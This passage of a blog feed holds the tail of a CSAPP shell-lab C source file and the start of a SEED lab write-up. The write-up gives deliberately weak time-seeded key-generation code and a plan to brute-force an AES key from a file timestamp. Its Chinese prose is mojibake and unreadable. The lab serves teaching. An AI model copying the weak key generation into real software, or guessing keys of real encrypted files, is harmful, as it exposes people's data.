class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">pid_t</span> fg = fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg)&#123;<br>        Kill(-fg,sig);<br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> olderrno = errno;<br>    <span class="hljs-keyword">pid_t</span> fg = fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(fg)&#123;<br>        Kill(-fg,sig);<br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*********************</span><br><span class="hljs-comment"> * End signal handlers</span><br><span class="hljs-comment"> *********************/</span><br><br><span class="hljs-comment">/***********************************************</span><br><span class="hljs-comment"> * Helper routines that manipulate the job list</span><br><span class="hljs-comment"> **********************************************/</span><br><br><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span> </span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>        max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>) &#123;<br>        jobs[i].pid = pid;<br>        jobs[i].state = state;<br>        jobs[i].jid = nextjid++;<br>        <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>        nextjid = <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>          <span class="hljs-keyword">if</span>(verbose)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid) &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs)+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>        <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>        <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    <span class="hljs-keyword">if</span> (jobs[i].pid == pid) &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++) &#123;<br>    <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>        <span class="hljs-keyword">switch</span> (jobs[i].state) &#123;<br>        <span class="hljs-keyword">case</span> BG: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> FG: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> ST: <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>, <br>               i, jobs[i].state);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>    &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;  <br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>    unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * my functions with error handling</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * fork error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">Fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Fork error&quot;</span>);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * execve error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[], <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> environ[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (execve(filename, argv, environ) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kill error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Kill</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> signum)</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> kr;<br><br>    <span class="hljs-keyword">if</span> ((kr = kill(pid, signum)) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Kill error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigemptyset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigemptyset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigemptyset(<span class="hljs-built_in">set</span>)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigemptyset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigaddset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigaddset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>,<span class="hljs-keyword">int</span> sign)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigaddset(<span class="hljs-built_in">set</span>,sign)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigaddset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigprocmask error handling</span><br><span class="hljs-comment"> */</span> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigprocmask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> how, <span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-keyword">sigset_t</span> *oldset)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigprocmask(how,<span class="hljs-built_in">set</span>,oldset)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigprocmask error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigfillset error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Sigfillset</span><span class="hljs-params">(<span class="hljs-keyword">sigset_t</span> *<span class="hljs-built_in">set</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(sigfillset(<span class="hljs-built_in">set</span>)&lt;<span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Sigfillset error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * setpgid error handling</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Setpgid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">pid_t</span> pgid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rc;<br><br>    <span class="hljs-keyword">if</span> ((rc = setpgid(pid, pgid)) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Setpgid error&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šPseudo Random Number Generation Lab</title>
    <link href="/p/c8db7269/"/>
    <url>/p/c8db7269/</url>
    
    <content type="html"><![CDATA[<h1 id="Task-1-Generate-Encryption-Key-in-a-Wrong-Way"><a href="#Task-1-Generate-Encryption-Key-in-a-Wrong-Way" class="headerlink" title="Task 1: Generate Encryption Key in a Wrong Way"></a>Task 1: Generate Encryption Key in a Wrong Way</h1><ul><li>   ä½¿ç”¨å½“å‰æ—¶é—´ä½œä¸ºä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ï¼Œç”Ÿæˆä¸€ä¸ª128ä½çš„åŠ å¯†ç§˜é’¥</li><li>  ç”¨ <code>time</code>å‡½æ•°æ¥è·å¾—ç³»ç»Ÿæ—¶é—´ï¼Œå®ƒçš„è¿”å›å€¼ä¸ºä»<code> 00:00:00 GMT, January 1, 1970</code> åˆ°ç°åœ¨æ‰€æŒç»­çš„ç§’æ•°</li><li>  <code>rand()</code>é…åˆ<code>srand()</code>å‡½æ•°è¿›è¡Œä½¿ç”¨ï¼Œå½“<code>srand()</code>çš„å‚æ•°å€¼å›ºå®šçš„æ—¶å€™ï¼Œ<code>rand()</code>è·å¾—çš„æ•°ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå®ƒè¿”å›ä¸€ä¸ªèŒƒå›´åœ¨ 0 åˆ° <code>RAND_MAX </code>ä¹‹é—´çš„ä¼ªéšæœºæ•°ã€‚æ‰€ä»¥ä¸€èˆ¬<code>srand</code>çš„å‚æ•°ç”¨<code>time(NULL)</code>ï¼Œå› ä¸ºç³»ç»Ÿçš„æ—¶é—´ä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥<code>rand()</code>è¿”å›çš„æ•°ï¼Œä¹Ÿå°±ä¸€ç›´åœ¨å˜ï¼Œç›¸å½“äºæ˜¯éšæœºæ•°</li></ul><p>ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEYSIZE 16</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">char</span> key[KEYSIZE];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>, (<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)time(<span class="hljs-literal">NULL</span>));<br>srand(time(<span class="hljs-literal">NULL</span>)); <br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KEYSIZE; i++) &#123;<br>key[i] = rand() % <span class="hljs-number">256</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)key[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ ./a.out <br><span class="hljs-number">1665748464</span><br>bba0f21c1012ceb31df267e5b<span class="hljs-number">673d461</span><br></code></pre></td></tr></table></figure><h1 id="Task-2-Guessing-the-Key"><a href="#Task-2-Guessing-the-Key" class="headerlink" title="Task 2: Guessing the Key"></a>Task 2: Guessing the Key</h1><p>å·²çŸ¥ï¼š</p><ul><li>åŠ å¯†æ–‡ä»¶çš„æ—¶é—´æˆ³æ˜¯â€œ2018-04-1723:08:49â€</li><li>ä»¥æ—¶é—´ä¸ºåŸºç¡€ç”Ÿæˆçš„ç§˜é’¥å¯èƒ½åœ¨å‰ä¸¤ä¸ªå°æ—¶å†…ç”Ÿæˆ</li><li>æ–‡ä»¶å¤´ä»¥% PDF-1.5å¼€å¤´</li><li><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Plaintext</span>: <span class="hljs-number">255044462</span>d<span class="hljs-number">312</span>e<span class="hljs-number">350</span>a<span class="hljs-number">25</span>d<span class="hljs-number">0</span>d<span class="hljs-number">4</span>c<span class="hljs-number">5</span>d<span class="hljs-number">80</span>a<span class="hljs-number">34</span><br><span class="hljs-attribute">Ciphertext</span>: d<span class="hljs-number">06</span>bf<span class="hljs-number">9</span>d<span class="hljs-number">0</span>dab<span class="hljs-number">8</span>e<span class="hljs-number">8</span>ef<span class="hljs-number">880660</span>d<span class="hljs-number">2</span>af<span class="hljs-number">65</span>aa<span class="hljs-number">82</span><br><span class="hljs-attribute">IV</span>: <span class="hljs-number">09080706050403020100</span>A<span class="hljs-number">2</span>B<span class="hljs-number">2</span>C<span class="hljs-number">2</span>D<span class="hljs-number">2</span>E<span class="hljs-number">2</span>F<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><p>æ€è·¯ï¼š</p><ul><li>  è®¡ç®—å‡ºæ—¶é—´çš„åŒºé—´ï¼Œæ—¶é—´ä½œä¸ºéšæœºç§å­</li><li>  ä½¿ç”¨AESç®—æ³•è¿›è¡Œæšä¸¾</li><li>  å°†ç»“æœä¸ç›®æ ‡å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…å³å¯</li><li>  <strong>éœ€è¦ç€é‡æ³¨æ„çš„ç‚¹ï¼šæ¯æ¬¡æ‰§è¡Œ<code>AES_cbc_encrypt</code>åï¼Œåˆå§‹å‘é‡ä¼šè¢«æ›´æ–°ï¼Œ æ‰€ä»¥éœ€è¦ä¿å­˜åˆå§‹å‘é‡ï¼ˆåœ¨è¿™ä¸ªåœ°æ–¹è¢«å¡äº†ä¸€æ¬¡ï¼‰</strong></li></ul><p>åœ¨Linux Cä¸­ä½¿ç”¨OpenSSLçš„ä¸€äº›å‰ç½®çŸ¥è¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> AES_ENCRYPT     1</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> AES_DECRYPT     0</span><br><br><span class="hljs-comment">//è®¾ç½®åŠ å¯†å¯†é’¥ï¼Œä½¿ç”¨å­—ç¬¦ç¼“å†²åŒº  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AES_set_encrypt_key</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *userKey,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> bits,  </span></span><br><span class="hljs-params"><span class="hljs-function">        AES_KEY *key)</span></span>;  <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AES_set_decrypt_key</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *userKey,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> bits,  </span></span><br><span class="hljs-params"><span class="hljs-function">        AES_KEY *key)</span></span>;  <br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AES_cbc_encrypt</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *in,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *out,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> length,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> AES_KEY *key,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *ivec,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> enc)</span></span>;  <br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°åç§°</th><th 